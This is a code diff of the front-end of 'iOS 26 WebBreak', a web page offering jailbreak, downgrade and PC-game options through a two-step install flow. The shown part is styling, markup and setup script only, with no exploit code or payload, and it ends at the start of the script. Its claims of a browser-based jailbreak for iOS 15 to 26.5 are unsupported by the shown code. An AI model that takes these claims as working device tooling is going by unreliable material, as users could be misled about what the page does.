+    }
+
+    #main-jailbreak-btn {
+      background: rgba(4, 4, 4, 0.92) !important;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08), 0 22px 46px -34px rgba(255, 255, 255, 0.5);
+    }
+
+    #lang-btn,
+    #info-btn,
+    #view-credits-btn,
+    #info-close-btn,
+    #lang-close-btn {
+      background: rgba(4, 4, 4, 0.72) !important;
+      border-color: rgba(255, 255, 255, 0.12) !important;
+    }
+
+    #lang-btn,
+    #info-btn {
+      position: relative;
+      overflow: hidden;
+      isolation: isolate;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08), 0 16px 36px -28px rgba(255, 255, 255, 0.55);
+    }
+
+    #lang-btn::before,
+    #info-btn::before {
+      content: '';
+      position: absolute;
+      inset: 1px;
+      border-radius: inherit;
+      background: linear-gradient(120deg, transparent 20%, rgba(255,255,255,0.14) 48%, transparent 76%);
+      transform: translateX(-135%);
+      transition: transform 0.65s ease;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    #lang-btn > *,
+    #info-btn > * {
+      position: relative;
+      z-index: 1;
+    }
+
+    #lang-btn:hover::before,
+    #info-btn:hover::before {
+      transform: translateX(135%);
+    }
+
+    #jb-selected-box,
+    #info-content,
+    #lang-content {
+      background: rgba(5, 5, 5, 0.88) !important;
+      border-color: rgba(255, 255, 255, 0.1) !important;
+    }
+
+    #status-badge {
+      background: rgba(4, 4, 4, 0.62) !important;
+      border-color: rgba(255, 255, 255, 0.1) !important;
+    }
+
+    body.language-swapping #hero-title,
+    body.language-swapping #category-tabs,
+    body.language-swapping #options-list,
+    body.language-swapping #continue-btn-container,
+    body.language-swapping #info-content {
+      opacity: 0;
+      transform: translateY(8px);
+      filter: blur(4px);
+    }
+
+    #hero-title,
+    #category-tabs,
+    #options-list,
+    #continue-btn-container,
+    #info-content {
+      transition: opacity 0.22s ease, transform 0.22s ease, filter 0.22s ease;
+    }
+
+    .category-nav-btn {
+      width: 2.45rem;
+      height: 2.45rem;
+      flex-shrink: 0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 9999px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.05);
+      color: rgba(255, 255, 255, 0.86);
+      transition: transform 0.22s ease, background 0.22s ease, border-color 0.22s ease;
+    }
+
+    .category-nav-btn:hover {
+      background: rgba(255, 255, 255, 0.09);
+      border-color: rgba(255, 255, 255, 0.16);
+    }
+
+    .category-nav-btn:active {
+      transform: scale(0.95);
+    }
+
+    .category-current-label {
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      text-align: center;
+      font-size: 1.04rem;
+      font-weight: 700;
+      color: rgba(255, 255, 255, 0.95);
+      letter-spacing: 0;
+      padding: 0 0.35rem;
+      transition: opacity 0.22s ease, transform 0.22s ease, filter 0.22s ease;
+      will-change: opacity, transform;
+    }
+
+    .category-current-label.is-transitioning {
+      opacity: 0;
+      filter: blur(4px);
+    }
+
+    .category-current-label.is-transitioning.is-forward {
+      transform: translateX(-16px);
+    }
+
+    .category-current-label.is-transitioning.is-backward {
+      transform: translateX(16px);
+    }
+
+    @media (min-width: 640px) {
+      .category-current-label {
+        font-size: 1.45rem;
+      }
+
+      .category-nav-btn {
+        width: 2.75rem;
+        height: 2.75rem;
+      }
+
+      .category-current-label {
+        font-size: 0.98rem;
+      }
+    }
+
+    .about-logo-wrap {
+      position: relative;
+      width: 4rem;
+      height: 4rem;
+      display: grid;
+      place-items: center;
+      border-radius: 1.25rem;
+      background: linear-gradient(145deg, rgba(255,255,255,0.14), rgba(255,255,255,0.04));
+      border: 1px solid rgba(255,255,255,0.12);
+      overflow: hidden;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.08), 0 18px 40px -28px rgba(255,255,255,0.9);
+    }
+
+    .about-logo-wrap::before {
+      content: '';
+      position: absolute;
+      inset: -30%;
+      background: radial-gradient(circle, rgba(255,255,255,0.22), transparent 64%);
+      animation: logoGlowBreath 5.5s ease-in-out infinite;
+    }
+
+    .about-logo-wrap img {
+      position: relative;
+      width: 2.8rem;
+      height: 2.8rem;
+      object-fit: contain;
+      filter: drop-shadow(0 0 10px rgba(255,255,255,0.22));
+    }
+
+    .about-stat,
+    .about-feature {
+      background: rgba(255,255,255,0.045);
+      border: 1px solid rgba(255,255,255,0.08);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);
+    }
+
+    .about-feature {
+      transition: transform 0.25s ease, background 0.25s ease, border-color 0.25s ease;
+    }
+
+    .about-feature:hover {
+      transform: translateY(-1px);
+      background: rgba(255,255,255,0.07);
+      border-color: rgba(255,255,255,0.13);
+    }
+
+    #share-btn {
+      position: relative;
+      overflow: hidden;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.38rem;
+      padding: 0.34rem 0.62rem;
+      min-height: 1.9rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.06);
+      color: rgba(255, 255, 255, 0.86);
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      white-space: nowrap;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+      flex-shrink: 0;
+    }
+
+    #share-btn::before {
+      content: '';
+      position: absolute;
+      inset: 1px;
+      border-radius: inherit;
+      background: linear-gradient(120deg, transparent 18%, rgba(255,255,255,0.12) 50%, transparent 82%);
+      transform: translateX(-135%);
+      transition: transform 0.65s ease;
+      pointer-events: none;
+    }
+
+    #share-btn:hover::before {
+      transform: translateX(135%);
+    }
+
+    #share-btn > * {
+      position: relative;
+      z-index: 1;
+    }
+
+    #share-btn i {
+      color: rgba(255, 255, 255, 0.72);
+      width: 0.82rem;
+      height: 0.82rem;
+      flex-shrink: 0;
+    }
+
+    #share-toast {
+      position: fixed;
+      top: 1.15rem;
+      left: 50%;
+      transform: translate(-50%, -140%);
+      z-index: 80;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.65rem;
+      padding: 0.8rem 1rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(74, 222, 128, 0.22);
+      background: rgba(5, 5, 5, 0.88);
+      color: rgba(255,255,255,0.95);
+      box-shadow: 0 20px 40px -28px rgba(74, 222, 128, 0.65), inset 0 1px 0 rgba(255,255,255,0.06);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      opacity: 0;
+      pointer-events: none;
+      transition: transform 0.45s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.35s ease;
+    }
+
+    #share-toast.show {
+      transform: translate(-50%, 0);
+      opacity: 1;
+    }
+
+    .share-toast-dot {
+      width: 0.55rem;
+      height: 0.55rem;
+      border-radius: 9999px;
+      background: #4ade80;
+      box-shadow: 0 0 14px rgba(74, 222, 128, 0.8);
+      animation: toastPulse 1.2s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes toastPulse {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.22); opacity: 1; }
+    }
+
+    html[lang="en"] .hero-title {
+      letter-spacing: -0.045em;
+      font-weight: 800;
+    }
+
+    html[lang="en"] .step-label,
+    html[lang="en"] #category-current-label,
+    html[lang="en"] .option-title,
+    html[lang="en"] #continue-btn,
+    html[lang="en"] #jb-btn-text {
+      letter-spacing: 0;
+    }
+
+    body[data-category="jailbreak"] {
+      --category-glow: rgba(34, 197, 94, 0.16);
+      --category-glow-soft: rgba(16, 185, 129, 0.06);
+    }
+
+    body[data-category="downgrade"] {
+      --category-glow: rgba(96, 165, 250, 0.16);
+      --category-glow-soft: rgba(59, 130, 246, 0.06);
+    }
+
+    body[data-category="pcgames"] {
+      --category-glow: rgba(255, 255, 255, 0.12);
+      --category-glow-soft: rgba(139, 92, 246, 0.05);
+    }
+
+    body[data-category="pcgames"] #category-tabs {
+      background: linear-gradient(90deg, rgba(255,255,255,0.025), rgba(255,255,255,0.05), rgba(255,255,255,0.025));
+      border-radius: 1rem;
+    }
+
+    #category-spotlight {
+      position: relative;
+      width: 100%;
+      max-width: 32rem;
+      margin: 0 auto 1.1rem;
+      padding: 1rem 1rem 0.95rem;
+      border-radius: 1.15rem;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      background:
+        linear-gradient(145deg, rgba(255,255,255,0.035), rgba(255,255,255,0.015)),
+        rgba(5, 5, 5, 0.58);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      overflow: hidden;
+      z-index: 1;
+    }
+
+    #category-spotlight::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(120% 120% at 0% 0%, rgba(255,255,255,0.06) 0%, transparent 55%);
+      pointer-events: none;
+      opacity: 0.8;
+    }
+
+    .category-spotlight-title {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      gap: 0.55rem;
+      font-size: 1.12rem;
+      font-weight: 700;
+      color: rgba(255, 255, 255, 0.95);
+      line-height: 1.25;
+    }
+
+    .category-spotlight-title-dot {
+      width: 0.5rem;
+      height: 0.5rem;
+      border-radius: 9999px;
+      background: var(--category-glow-dot, rgba(255,255,255,0.88));
+      box-shadow: 0 0 14px var(--category-glow-dot, rgba(255,255,255,0.45));
+      flex-shrink: 0;
+    }
+
+    .category-spotlight-desc {
+      position: relative;
+      z-index: 1;
+      margin-top: 0.45rem;
+      font-size: 0.98rem;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.62);
+      text-align: left;
+    }
+
+    .category-spotlight-tags {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.45rem;
+      margin-top: 0.8rem;
+    }
+
+    .category-spotlight-footer {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.45rem;
+      margin-top: 0.8rem;
+      align-items: center;
+    }
+
+    .category-spotlight-footer .category-spotlight-tags {
+      margin-top: 0;
+      align-items: center;
+    }
+
+    .category-spotlight-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.38rem;
+      padding: 0.34rem 0.62rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.06);
+      color: rgba(255, 255, 255, 0.86);
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      white-space: nowrap;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+    }
+
+    .category-spotlight-tag::before {
+      content: '';
+      width: 0.38rem;
+      height: 0.38rem;
+      border-radius: 9999px;
+      background: currentColor;
+      opacity: 0.95;
+      box-shadow: 0 0 10px currentColor;
+      flex-shrink: 0;
+    }
+
+    .category-spotlight-tag.is-gold {
+      border-color: rgba(251, 191, 36, 0.28);
+      background: rgba(251, 191, 36, 0.12);
+      color: #fcd34d;
+    }
+
+    .downgrade-track-badge {
+      display: inline-flex;
+      align-items: center;
+      width: fit-content;
+      padding: 0.28rem 0.55rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(96, 165, 250, 0.22);
+      background: rgba(96, 165, 250, 0.1);
+      color: #bfdbfe;
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      white-space: nowrap;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
+    }
+
+    .downgrade-track-badge.is-gold {
+      border-color: rgba(251, 191, 36, 0.28);
+      background: rgba(251, 191, 36, 0.12);
+      color: #fcd34d;
+    }
+
+    body[data-category="jailbreak"] {
+      --category-glow-dot: rgba(74, 222, 128, 0.95);
+    }
+
+    #options-list[data-category="pcgames"] .option-item {
+      background:
+        linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02) 34%, rgba(255,255,255,0.035) 100%),
+        rgba(3, 3, 3, 0.72);
+      border-color: rgba(255, 255, 255, 0.12);
+    }
+
+    #options-list[data-category="pcgames"] .option-icon-wrapper {
+      border-radius: 0.9rem;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.08);
+    }
+
+    body[data-category="downgrade"] {
+      --category-glow-dot: rgba(147, 197, 253, 0.95);
+    }
+
+    body[data-category="downgrade"] #category-spotlight {
+      background:
+        linear-gradient(140deg, rgba(59,130,246,0.1), rgba(37,99,235,0.04) 34%, rgba(15,23,42,0.08) 100%),
+        rgba(5, 5, 5, 0.64);
+      border-color: rgba(96, 165, 250, 0.16);
+    }
+
+    #options-list[data-category="downgrade"] .option-item {
+      background:
+        linear-gradient(145deg, rgba(96,165,250,0.06), rgba(59,130,246,0.025) 32%, rgba(3,3,3,0.02) 100%),
+        rgba(3, 3, 3, 0.68);
+      border-color: rgba(96, 165, 250, 0.11);
+    }
+
+    #options-list[data-category="downgrade"] .option-item:not(.selected):hover,
+    #options-list[data-category="downgrade"] .option-item:not(.selected):focus-visible {
+      border-color: rgba(125, 211, 252, 0.18);
+      box-shadow: 0 12px 34px -24px rgba(96, 165, 250, 0.25);
+    }
+
+    body[data-category="pcgames"] {
+      --category-glow-dot: rgba(255, 255, 255, 0.9);
+    }
+
+    @media (min-width: 768px) {
+      #category-spotlight {
+        max-width: 56rem;
+        padding: 1rem 1.1rem;
+      }
+    }
+
+    @media (hover: hover) {
+      #main-jailbreak-btn:hover::before {
+        opacity: 0.1;
+      }
+    }
+    @keyframes ambient-float {
+      0% {
+        transform: translate(0, 0);
+      }
+      100% {
+        transform: translate(var(--ambient-tx), var(--ambient-ty));
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.001ms !important;
+        animation-iteration-count: 1 !important;
+        scroll-behavior: auto !important;
+        transition-duration: 0.001ms !important;
+      }
+
+      #stars-canvas {
+        display: none;
+      }
+
+    }
+  </style>
+</head>
+<body>
+  <!-- Body touch-action to enable immediate :active states on iOS -->
+  <div ontouchstart=""></div>
+
+  <div id="share-toast" role="status" aria-live="polite" aria-atomic="true">
+    <span class="share-toast-dot" aria-hidden="true"></span>
+    <span id="share-toast-text">Thank You! Link Copied</span>
+  </div>
+
+  <!-- Background Stars -->
+  <canvas id="stars-canvas" aria-hidden="true"></canvas>
+
+  <!-- System Status Badge -->
+  <div class="absolute top-6 left-6 z-20">
+    <div id="status-badge" class="inline-flex items-center gap-2 px-3 sm:px-4 py-2 rounded-full border border-white/10 bg-white/5 backdrop-blur-sm">
+      <span class="w-2 h-2 rounded-full bg-green-400 animate-pulse shrink-0" id="system-status-dot"></span>
+      <span class="text-[10px] sm:text-xs font-semibold tracking-wider text-white/70 uppercase whitespace-nowrap" id="system-ready-txt">System Supported</span>
+    </div>
+  </div>
+
+  <!-- Info & Lang Buttons -->
+  <div class="absolute top-6 right-6 flex flex-col items-end gap-2 z-20">
+    <div class="flex items-center gap-2">
+      <button id="lang-btn" type="button" aria-haspopup="dialog" aria-controls="lang-modal" aria-expanded="false" class="px-3 h-10 bg-white/5 rounded-full flex items-center justify-center backdrop-blur-md border border-white/10 transition-transform active:scale-90 hover:bg-white/10 text-sm font-semibold text-white/80 focus:outline-none">
+        <i data-lucide="globe" class="w-4 h-4 mr-1.5"></i> <span id="lang-btn-text">EN</span>
+      </button>
+      <button id="info-btn" type="button" aria-label="Information" aria-haspopup="dialog" aria-controls="info-modal" aria-expanded="false" class="w-10 h-10 bg-white/5 rounded-full flex items-center justify-center backdrop-blur-md border border-white/10 transition-transform active:scale-90 hover:bg-white/10 focus:outline-none">
+        <i data-lucide="info" class="w-5 h-5 text-white/80"></i>
+      </button>
+    </div>
+  </div>
+
+  <!-- Language Modal -->
+  <div id="lang-modal" role="dialog" aria-modal="true" aria-labelledby="lang-modal-title" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300">
+    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" id="lang-backdrop"></div>
+    <div class="relative w-full max-w-sm md:max-w-md bg-[#111] border border-white/10 rounded-3xl flex flex-col shadow-2xl transform scale-95 opacity-0 transition-all duration-300 max-h-[85vh] overflow-hidden" id="lang-content">
+      
+      <div class="p-6 pb-2 overflow-y-auto no-scrollbar scroll-smooth">
+        <h2 class="text-2xl font-bold mb-4" id="lang-modal-title">Language</h2>
+        
+        <div class="flex flex-col gap-2">
+          <button type="button" class="lang-option w-full p-4 rounded-xl border border-white/10 transition-all text-left flex items-center justify-between" data-lang="en">
+            <span class="font-medium text-white">English</span>
+            <i data-lucide="check" class="w-5 h-5 text-green-400 hidden lang-check"></i>
+          </button>
+          <button type="button" class="lang-option w-full p-4 rounded-xl border border-transparent transition-all text-left flex items-center justify-between" data-lang="ru">
+            <span class="font-medium text-white/70">Русский</span>
+            <i data-lucide="check" class="w-5 h-5 text-green-400 hidden lang-check"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="p-6 pt-6 shrink-0 border-t border-white/5 bg-[#111] mt-2">
+        <button id="lang-close-btn" type="button" class="w-full py-3.5 bg-white/10 hover:bg-white/15 active:bg-white/20 rounded-xl font-semibold transition-colors active:scale-95 text-white">
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Selection Screen -->
+  <div id="selection-screen">
+    
+    <div class="text-center mb-10 px-4 flex flex-col items-center mt-16 sm:mt-12">
+      <div class="step-indicator mb-5" id="step-indicator" aria-label="Progress">
+        <div class="step-chip is-active" id="step-chip-1">
+          <span class="step-dot"></span>
+          <span class="step-label" id="step-label-1">Step 1 - Select</span>
+        </div>
+        <span class="step-divider" aria-hidden="true"></span>
+        <div class="step-chip" id="step-chip-2">
+          <span class="step-dot"></span>
+          <span class="step-label" id="step-label-2">Step 2 - Launch</span>
+        </div>
+      </div>
+      <div class="hero-heading">
+        <div class="hero-logo-shell" aria-hidden="true">
+          <span class="hero-logo-glow"></span>
+          <img id="hero-logo" class="hero-logo" src="webbreak-logo-white.png" alt="" aria-hidden="true" decoding="async">
+        </div>
+        <h1 class="text-4xl sm:text-5xl md:text-6xl font-black tracking-tight gradient-text hero-title" id="hero-title">
+        Let's Get Started
+        </h1>
+      </div>
+    </div>
+
+    <!-- Category Tabs -->
+    <div class="relative mb-6 w-full max-w-md sm:max-w-2xl md:max-w-3xl mx-auto select-none">
+      <div id="category-tabs" class="relative flex items-center gap-2 sm:gap-3 p-1.5 sm:p-2 bg-white/5 rounded-2xl border border-white/10">
+        <button id="category-prev" type="button" class="category-nav-btn" aria-label="Previous section">
+          <i data-lucide="chevron-left" class="w-4 h-4 sm:w-5 sm:h-5"></i>
+        </button>
+        <div class="min-w-0 flex-1 flex items-center justify-center">
+          <div id="category-current-label" class="category-current-label">Jailbreak</div>
+        </div>
+        <button id="category-next" type="button" class="category-nav-btn" aria-label="Next section">
+          <i data-lucide="chevron-right" class="w-4 h-4 sm:w-5 sm:h-5"></i>
+        </button>
+      </div>
+    </div>
+
+    <div id="category-spotlight" aria-live="polite">
+      <div class="category-spotlight-title" id="category-spotlight-title">
+        <span class="category-spotlight-title-dot" aria-hidden="true"></span>
+        <span id="category-spotlight-title-text">Jailbreak Tools</span>
+      </div>
+      <div class="category-spotlight-desc" id="category-spotlight-desc">Choose a tool and continue to the installation step.</div>
+      <div class="category-spotlight-footer">
+        <div class="category-spotlight-tags" id="category-spotlight-tags"></div>
+        <button id="share-btn" type="button" class="category-spotlight-tag transition-transform active:scale-90 hover:bg-white/10 focus:outline-none">
+          <span id="share-btn-label">Share</span>
+          <i data-lucide="share-2" class="w-3.5 h-3.5"></i>
+        </button>
+      </div>
+    </div>
+
+    <div id="options-list">
+      <!-- Rendered via JS -->
+    </div>
+
+    <div id="continue-btn-container">
+      <button id="continue-btn" type="button" class="group" aria-disabled="true" disabled>
+        Continue
+        <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>
+      </button>
+    </div>
+  </div>
+
+  <!-- Jailbreak Screen -->
+  <div id="jailbreak-screen" class="relative overflow-hidden w-full h-full flex flex-col justify-center items-center">
+    <div class="relative z-10 flex flex-col items-center w-full">
+      <div class="step-indicator mb-10" id="jb-step-indicator" aria-label="Progress">
+        <div class="step-chip" id="jb-step-chip-1">
+          <span class="step-dot"></span>
+          <span class="step-label" id="jb-step-label-1">Step 1 - Select</span>
+        </div>
+        <span class="step-divider" aria-hidden="true"></span>
+        <div class="step-chip is-active" id="jb-step-chip-2">
+          <span class="step-dot"></span>
+          <span class="step-label" id="jb-step-label-2">Step 2 - Launch</span>
+        </div>
+      </div>
+      <!-- Animated Border Line Container -->
+      <div class="relative flex items-center justify-center group cursor-pointer transition-all duration-300 transform-gpu rounded-full" id="jb-btn-wrapper">
+        <div class="jb-button-halo" aria-hidden="true"></div>
+        <div class="jb-pulse-waves" aria-hidden="true">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+        <!-- The orbital loading ring -->
+        <svg class="jb-orbit-ring" viewbox="0 0 320 104" preserveaspectratio="none" aria-hidden="true">
+          <defs>
+            <lineargradient id="jb-green-gradient" x1="0" y1="0" x2="320" y2="0" gradientunits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#052e16">
+                <animate attributename="stop-color" values="#052e16;#16a34a;#22c55e;#052e16" dur="3.4s" repeatcount="indefinite"></animate>
+              </stop>
+              <stop offset="32%" stop-color="#16a34a">
+                <animate attributename="stop-color" values="#16a34a;#4ade80;#15803d;#16a34a" dur="3.4s" repeatcount="indefinite"></animate>
+              </stop>
+              <stop offset="65%" stop-color="#86efac">
+                <animate attributename="stop-color" values="#86efac;#bbf7d0;#22c55e;#86efac" dur="3.4s" repeatcount="indefinite"></animate>
+              </stop>
+              <stop offset="100%" stop-color="#047857">
+                <animate attributename="stop-color" values="#047857;#22c55e;#064e3b;#047857" dur="3.4s" repeatcount="indefinite"></animate>
+              </stop>
+            </lineargradient>
+          </defs>
+          <rect class="jb-orbit-track" x="3" y="3" width="314" height="98" rx="49" pathlength="100"></rect>
+          <rect class="jb-orbit-line" x="3" y="3" width="314" height="98" rx="49" pathlength="100"></rect>
+        </svg>
+        
+        <button id="main-jailbreak-btn" type="button" class="!border-none bg-[#0a0a0a]/80 backdrop-blur-xl text-white relative z-10 w-full transition-all duration-300 shadow-2xl overflow-hidden rounded-full">
+          <span class="relative z-20 drop-shadow-md text-xl sm:text-2xl font-bold tracking-wide" id="jb-btn-text">Start Installation</span>
+        </button>
+      </div>
+
+      <div id="jb-selected-container" class="mt-12 flex flex-col items-center opacity-0 transform translate-y-4 transition-all duration-700 delay-300 relative">
+        <span class="text-white/50 text-sm font-medium mb-3 relative z-10 uppercase tracking-widest" id="jb-your-option-lbl" style="color: var(--theme-color, rgba(255,255,255,0.5));">You selected:</span>
+        <div class="px-6 py-3 bg-white/5 border rounded-2xl backdrop-blur-md flex items-center justify-center shadow-lg w-full max-w-[320px] relative z-10" id="jb-selected-box" style="border-color: var(--theme-color, rgba(255,255,255,0.1)); border-width: 1px;">
+          <div class="flex items-center gap-4" id="jb-selected-value">
+            <!-- Icon and Title injected here -->
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+    <!-- Info Modal -->
+  <div id="info-modal" role="dialog" aria-modal="true" aria-labelledby="info-title" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300">
+    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" id="info-backdrop"></div>
+    <div class="relative w-full max-w-sm md:max-w-lg bg-[#111] border border-white/10 rounded-3xl flex flex-col shadow-2xl transform scale-95 opacity-0 transition-all duration-300 max-h-[85vh] overflow-hidden" id="info-content">
+      
+      <div id="info-scroll-area" class="p-6 overflow-y-auto no-scrollbar scroll-smooth">
+        <div class="flex items-center gap-4 mb-5">
+          <div class="about-logo-wrap" aria-hidden="true">
+            <img src="webbreak-logo-white.png" alt="" decoding="async">
+          </div>
+          <div class="min-w-0">
+            <div id="info-pill" class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-green-400/10 text-green-300 border border-green-400/20 text-[11px] font-bold uppercase tracking-wide mb-2">
+              <span class="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>
+              Concept Build
+            </div>
+            <h2 id="info-title" class="text-2xl font-black tracking-tight">iOS 26 WebBreak</h2>
+          </div>
+        </div>
+        <p id="info-desc" class="text-white/70 text-sm mb-5 leading-relaxed">
+          A polished Web-Break interface with guided choices, adaptive visuals, and a clean launch flow.
+        </p>
+        
+        <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 mb-5">
+          <div class="about-stat rounded-2xl p-3 text-sm">
+            <span id="version-lbl" class="text-white/50">Version</span>
+            <div class="font-mono mt-1 text-white/90">1.2.5</div>
+          </div>
+          <div class="about-stat rounded-2xl p-3 text-sm">
+            <span id="compat-lbl" class="text-white/50">Compatibility</span>
+            <div class="text-green-400 font-semibold mt-1">iOS 15.0 - 26.5</div>
+          </div>
+          <div class="about-stat rounded-2xl p-3 text-sm">
+            <span id="build-lbl" class="text-white/50">Interface</span>
+            <div class="text-white/90 font-semibold mt-1">Web-Break</div>
+          </div>
+        </div>
+
+        <div class="space-y-2 mb-6">
+          <div class="about-feature flex items-center gap-3 rounded-2xl p-3">
+            <div class="w-9 h-9 rounded-xl bg-green-400/10 flex items-center justify-center shrink-0">
+              <i data-lucide="sparkles" class="w-4 h-4 text-green-300"></i>
+            </div>
+            <span id="about-feature-flow" class="text-sm text-white/75">Guided flow for tools, rollback, and apps.</span>
+          </div>
+          <div class="about-feature flex items-center gap-3 rounded-2xl p-3">
+            <div class="w-9 h-9 rounded-xl bg-cyan-400/10 flex items-center justify-center shrink-0">
+              <i data-lucide="palette" class="w-4 h-4 text-cyan-300"></i>
+            </div>
+            <span id="about-feature-theme" class="text-sm text-white/75">Theme color adapts to the selected option.</span>
+          </div>
+          <div class="about-feature flex items-center gap-3 rounded-2xl p-3">
+            <div class="w-9 h-9 rounded-xl bg-white/10 flex items-center justify-center shrink-0">
+              <i data-lucide="image" class="w-4 h-4 text-white/80"></i>
+            </div>
+            <span id="about-feature-icons" class="text-sm text-white/75">Real icons are used where reliable sources exist.</span>
+          </div>
+        </div>
+
+        <button id="view-credits-btn" type="button" aria-expanded="false" class="w-full py-2.5 mb-2 rounded-xl text-sm font-semibold bg-white/5 hover:bg-white/10 active:bg-white/15 transition-colors border border-white/5 flex items-center justify-center gap-2">
+          <span>View Credits</span>
+          <i data-lucide="chevron-down" class="w-4 h-4 text-white/50"></i>
+        </button>
+
+        <div id="credits-section" class="pt-6 pb-2 hidden">
+          <h3 id="credits-title" class="text-base font-bold mb-4 text-white/80 uppercase tracking-widest">Credits</h3>
+          <div class="space-y-4">
+             <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-[#2AABEE]/10 flex items-center justify-center shrink-0">
+                  <i data-lucide="send" class="w-5 h-5 text-[#2AABEE]"></i>
+                </div>
+                <div class="flex flex-col">
+                  <span class="text-white/90 font-medium text-sm">@VityaV [Telegram]</span>
+                  <span id="role-designer" class="text-white/50 text-xs">Lead Designer &amp; Concept Author</span>
+                </div>
+             </div>
+             
+             <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center shrink-0">
+                  <i data-lucide="bot" class="w-5 h-5 text-purple-400"></i>
+                </div>
+                <div class="flex flex-col">
+                  <span class="text-white/90 font-medium text-sm">Gemini | Codex</span>
+                  <span id="role-ai" class="text-white/50 text-xs">AI Engineering &amp; Code Generation</span>
+                </div>
+             </div>
+
+             <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-green-500/10 flex items-center justify-center shrink-0">
+                  <i data-lucide="globe" class="w-5 h-5 text-green-400"></i>
+                </div>
+                <div class="flex flex-col">
+                  <span class="text-white/90 font-medium text-sm">rooted~us3r</span>
+                  <span id="role-infra" class="text-white/50 text-xs">Infrastructure &amp; Sub-domain Provisioning</span>
+                </div>
+             </div>
+
+             <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-cyan-500/10 flex items-center justify-center shrink-0">
+                  <i data-lucide="refresh-cw" class="w-5 h-5 text-cyan-400"></i>
+                </div>
+                <div class="flex flex-col">
+                  <span class="text-white/90 font-medium text-sm">Neonmodder123</span>
+                  <span id="role-execution" class="text-white/50 text-xs">Browser-to-SpringBoard Execution Logic (Respring)</span>
+                </div>
+             </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="p-6 pt-3 shrink-0 border-t border-white/5 bg-[#111]">
+        <button id="info-close-btn" type="button" class="w-full py-3.5 bg-white/10 hover:bg-white/15 active:bg-white/20 rounded-xl font-semibold transition-colors active:scale-95">
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div id="panic-screen" class="panic-screen" aria-hidden="true"></div>
+
+  <!-- Audio preload -->
+  <audio id="jb-audio" src="otkat.mp3" preload="auto"></audio>
+
+  <script>
+    const prefersReducedMotion = (() => {
+      try {
+        return !!(window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches);
+      } catch (_) {
+        return false;
+      }
+    })();
+
+    function safeCreateIcons() {
+      if (window.lucide && typeof window.lucide.createIcons === 'function') {
+        try {
+          window.lucide.createIcons();
+        } catch (_) {}
+      }
+    }
+
+    function setNodeText(id, text) {
+      const node = document.getElementById(id);
+      if (node) node.innerText = text;
+    }
+
+    function setNodeHTML(id, html) {
+      const node = document.getElementById(id);
+      if (node) node.innerHTML = html;
+    }
+
+    function setAppHeight() {
+      document.documentElement.style.setProperty('--app-height', `${window.innerHeight}px`);
+    }
+
+    setAppHeight();
+    window.addEventListener('resize', setAppHeight, { passive: true });
+    window.addEventListener('orientationchange', setAppHeight, { passive: true });
+
+    // 1. Starfield Background
